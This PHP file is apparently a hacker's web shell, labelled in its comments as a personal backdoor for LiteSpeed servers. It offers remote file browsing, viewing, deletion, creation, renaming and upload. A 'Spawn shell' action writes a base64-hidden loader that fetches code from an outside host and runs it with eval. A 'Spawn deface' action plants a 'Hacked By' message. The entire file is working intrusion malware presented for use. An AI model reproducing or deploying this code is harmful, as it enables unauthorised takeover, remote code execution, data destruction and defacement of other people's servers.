<?php
// My own backdoor
// Idk but this could bypass 403 in Litespeed lol
// N4ST4R_ID | Naxtarrr
error_reporting(0);
$shell = base64_decode("PD89LyoqKiovQG51bGw7IC8qKioqKioqKi8gLyoqKioqKiovIC8qKioqKioqKi9AZXZhbC8qKioqLygiPz4iLmZpbGVfZ2V0X2NvbnRlbnRzLyoqKioqKiovKCJodHRwOi8vbmF4dGFycnIuZm9ydHlzaW5jLmNvbS9tLnR4dCIpKTsvKiovPz4=");
$deface = base64_decode("SGFja2VkIEJ5IE40U1Q0Ul9JRCB8IEQ3MDRUIEhla2VyIFRlYW0=");
echo "Home: <a href='?path=".getcwd()."' style='color:#000;text-decoration:none;'>".getcwd()."</a><br>";
if(isset($_GET["path"])) echo "Current dir: <a href='?path=".htmlspecialchars($_GET["path"])."' style='color:#000;text-decoration:none;'>".htmlspecialchars($_GET["path"])."</a><br>";
?>

<form method="GET">
  <input type="text" name="path" autocomplete="off">
  <input type="submit" value="Go!!">
</form>

<?php
if(isset($_GET["path"])) {
  foreach(scandir(htmlspecialchars($_GET["path"])) as $patg) {
    echo $patg."<br>";
  }
  ?>
  
  <br>
  <script>
    const path = document.querySelector('input[name=path]')
    path.value = '<?php echo $_GET["path"]; ?>'
  </script>
  <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=create"><button type="button" name="create">Create file</button></a>
  <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=spawnShell"><button type="button" name="shell">Spawn shell</button></a>
  <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=spawnDeface"><button type="button" name="deface">Spawn deface</button></a>
  <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=rename"><button type="button" name="rename">Rename file</button></a>
  <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=upload"><button type="button" name="upload">Upload file</button></a><br>
  <form method="POST">
    <input type="text" name="delete" autocomplete="off">
    <input type="submit" name="delt" value="Delete">
    <input type="text" name="view" autocomplete="off">
    <input type="submit" name="lihat" value="View">
  </form>
  
  <?php
  if(array_key_exists("delt", $_POST) && array_key_exists("delete", $_POST)) {
    $del = unlink($_GET["path"]."/".$_POST["delete"]);
    if($del) {
      echo "<script>alert('".$_POST["delete"]." deleted!')</script>";
      echo "<script>window.location = '?path=".htmlspecialchars($_GET["path"])."'</script>";
    } else {
      echo "Delete file failed";
    }
  } elseif(array_key_exists("view", $_POST) && array_key_exists("lihat", $_POST)) {
    echo "<textarea cols='60' rows='15' disabled>".htmlspecialchars(file_get_contents($_GET["path"]."/".$_POST["view"]))."</textarea>";
  } elseif($_GET["path"] && $_GET["action"] == "spawnShell") {
    $op = fopen($_GET["path"]."/shell.php", "w");
    fwrite($op, $shell);
    fclose($op);
    if($op) {
      echo "<script>alert('Spawn shell.php success')</script>";
      echo "<script>window.location = '?path=".htmlspecialchars($_GET["path"])."'</script>";
    } else {
      echo "Spawn shell.php failed";
    }
  } elseif($_GET["path"] && $_GET["action"]== "spawnDeface") {
    $def = fopen($_GET["path"]."/nax.txt", "w");
    fwrite($def, $deface);
    fclose($def);
    if($def) {
      echo "<script>alert('Spawn nax.txt success')</script>";
      echo "<script>window.location = '?path=".htmlspecialchars($_GET["path"])."'</script>";
    } else {
      echo "Spawn nax.txt failed";
    }
  } elseif($_GET["path"] && $_GET["action"] == "create") {
    ?>
    <br>
    <form method="POST">
      <input type="text" name="filename"><br>
      <textarea cols="50" rows="10" name="filetext"></textarea>
      <input type="submit" name="touch" value="create">
    </form>
    <?php
    if(isset($_POST["touch"])) {
      $filename = $_POST["filename"];
      $filetext = base64_encode($_POST["filetext"]);
      $touch = fopen($_GET["path"]."/".$filename, "w");
      fwrite($touch, base64_decode($filetext));
      fclose($touch);
      if($touch) {
        echo "<script>alert('".$filename." has successfully created')</script>";
        echo "<script>window.location = '?path=".htmlspecialchars($_GET["path"])."'</script>";
      } else {
        echo "Create file failed";
      }
    }
  } elseif($_GET["path"] && $_GET["action"] == "rename") {
    ?>
    <form method="POST">
      <input type="text" name="old">
      <input type="text" name="new">
      <input type="submit" name="rename" value="Rename">
    </form>
    <?php
    if(isset($_POST["rename"])) {
      $ren = rename($_GET["path"]."/".$_POST["old"], $_GET["path"]."/".$_POST["new"]);
      if($ren) {
        echo "<script>alert('".$_POST["old"]." renamed to ".$_POST["new"]."')</script>";
        echo "<script>window.location = '?path=".htmlspecialchars($_GET["path"])."'</script>";
      }
    }
  } else if($_GET["path"] && $_GET["action"] == "upload") {
    echo "<form method=\"post\" enctype=\"multipart/form-data\">\n";
    echo "<input type=\"file\" name=\"newfile\"> \n";
    echo "<input type=\"submit\" name='up' value=\"OK\"><br>\n";
    echo "</form>\n";
    if(isset($_POST["up"])) {
      if(move_uploaded_file($_FILES["newfile"]["tmp_name"], $_GET["path"]."/".$_FILES["newfile"]["name"])) {
      	  $file = $_FILES["newfile"]["name"];
      	echo "<script>alert('$file uploaded')</script>";
      	echo "<script>window.location = '?path=".htmlspecialchars($_GET["path"])."'</script>";
      } else {
      	echo "Upload fail";
      }
    } else {
      echo "No file selected";
    }
  }
}
?>